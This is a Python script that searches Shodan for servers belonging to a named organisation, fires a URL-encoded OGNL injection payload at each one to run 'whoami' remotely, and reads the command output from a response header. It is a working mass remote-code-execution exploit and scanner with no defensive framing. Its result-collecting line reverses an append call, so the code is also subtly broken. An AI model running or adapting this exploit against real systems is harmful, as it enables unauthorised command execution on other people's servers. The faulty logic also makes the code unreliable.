import shodan
import signal
import sys
import requests

YOUR_API_KEY_HERE=''
api_call=shodan.Shodan(YOUR_API_KEY_HERE)
query = 'http.favicon.hash:-305179312 org:'+' '.join(sys.argv[1:])


payload='/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36'}

def handler(signum, frame):
    res = input("Ctrl-c was pressed. Do you really want to exit? y/n ")
    if res == 'y':
        exit(1)
 

if len(sys.argv) == 1:
        print('Usage: %s <organisation name>' % sys.argv[0])
        sys.exit(1)

def getting_total_ips():
    try:
        total_ips=api_call.count(query)
        return total_ips['total']
    except Exception as e:
        print('Error: %s' % e)
        sys.exit(1)
    


def page(total_ips):
    if total_ips<100:
        pages=1
    else:
        pages=(total_ips//100)+1
    return pages

def remove_duplicate_ip(duplicate):
    final_list = []
    for num in duplicate:
        if num not in final_list:
            final_list.append(num)
    return final_list


def getting_ip_list(total_ips):
    ip_list=[]
    if total_ips==0:
        sys.exit(1)
    else:
        try:
            number_of_page=page(total_ips)
            for pages in range(number_of_page):
                result = api_call.search(query,page=pages)
                for service in result['matches']:
                    ip_list.append(service['ip_str'])   
        except Exception as e:
            print('Error: %s' % e)
    return ip_list



def vuln_checker(unique_IPs):
    vulnerable_server=[]
    error_logs=[]
    for ip in unique_IPs:
        url='http://'+str(ip)+payload
        try:
            resp=requests.get(url,headers=headers,allow_redirects=False, verify=False)
            if resp.status_code == 302 and 'X-Cmd-Response' in resp.headers:
                ip.append(vulnerable_server)
                print("target is vulnerable,"+ " command(whoami) output: "+ resp.headers['X-Cmd-Response'])
        except Exception as e:
            error_logs.append('Error: %s' % e)
    return vulnerable_server,error_logs
        


def writing_in_file(IPs,filename):
    with open('{}'.format(filename), 'w') as fp:
        for ip in IPs:
            fp.write("%s\n" % ip)
    return None


if __name__ == '__main__':
    signal.signal(signal.SIGINT, handler)
    print("Query made to Shodan: "+query)
    total_ips=getting_total_ips()
    print("Total IPs found: "+str(total_ips))
    ip_list=getting_ip_list(total_ips)
    unique_IPs=remove_duplicate_ip(ip_list)
    print("Number of IPs to be checked: "+str(len(unique_IPs)))
    vulnerable,error_logs=vuln_checker(unique_IPs)
    writing_in_file(error_logs,"error_file_{}".format(str(sys.argv[1])))
    print("Vulnerable IPs: "+str(len(vulnerable)))
    if(len(vulnerable)!=0):
        writing_in_file(vulnerable, "result_file_{}".format(str(sys.argv[1])))
        print("Results saved in result_file_{}".format(str(sys.argv[1])))
    